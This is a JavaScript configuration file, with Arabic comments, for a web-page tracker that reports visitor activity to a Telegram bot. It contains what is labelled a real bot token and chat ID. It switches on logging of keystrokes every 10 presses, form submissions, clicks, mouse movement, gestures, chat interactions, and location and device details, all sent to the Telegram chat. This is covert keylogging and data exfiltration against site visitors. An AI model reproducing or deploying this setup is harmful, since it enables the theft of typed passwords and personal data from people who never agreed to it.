// ⚙️ إعدادات بوت التيليجرام
const TELEGRAM_CONFIG = {
    // معلومات البوت الحقيقية
    BOT_TOKEN: '7651839428:AAGsb4LkCVKuDmF3Fn4QzVQ8KlpvX27JzII',
    CHAT_ID: '987654321',
    
    // إعدادات متقدمة
    SETTINGS: {
        // تفعيل/إلغاء أنواع التتبع
        trackPageViews: true,
        trackClicks: true,
        trackForms: true,
        trackScrolling: true,
        trackTimeSpent: true,
        trackMouseMovement: true,
        trackKeystrokes: true,
        trackMobileGestures: true,
        trackChatInteractions: true,
        
        // فترات الإرسال (بالثواني)
        scrollReportInterval: 25, // كل 25% تمرير
        timeReportInterval: 60,   // كل دقيقة
        mouseReportThreshold: 100, // كل 100 حركة
        keyReportThreshold: 10,    // كل 10 ضغطات
        touchReportThreshold: 10,  // كل 10 لمسات
        
        // تصفية الرسائل
        minSessionTime: 5, // الحد الأدنى لوقت الجلسة (ثواني)
        maxMessageLength: 4000, // الحد الأقصى لطول الرسالة
        
        // معلومات إضافية
        includeUserAgent: true,
        includeScreenInfo: true,
        includeLocationInfo: true,
        includeReferrerInfo: true
    },
    
    // رسائل مخصصة
    MESSAGES: {
        newVisitor: '🎯 زائر جديد',
        pageView: '📄 عرض صفحة',
        click: '🖱️ نقرة',
        formSubmit: '📋 إرسال نموذج',
        scroll: '📜 تمرير',
        timeUpdate: '⏱️ تحديث الوقت',
        mouseActivity: '🖱️ نشاط الماوس',
        keyboardActivity: '⌨️ نشاط الكتابة',
        pageExit: '🚪 مغادرة الصفحة',
        mobileGesture: '📱 إيماءة هاتف',
        chatInteraction: '💬 تفاعل دردشة'
    }
};

// تحديث إعدادات النظام
if (window.telegramTracker) {
    window.telegramTracker.updateConfig(TELEGRAM_CONFIG);
}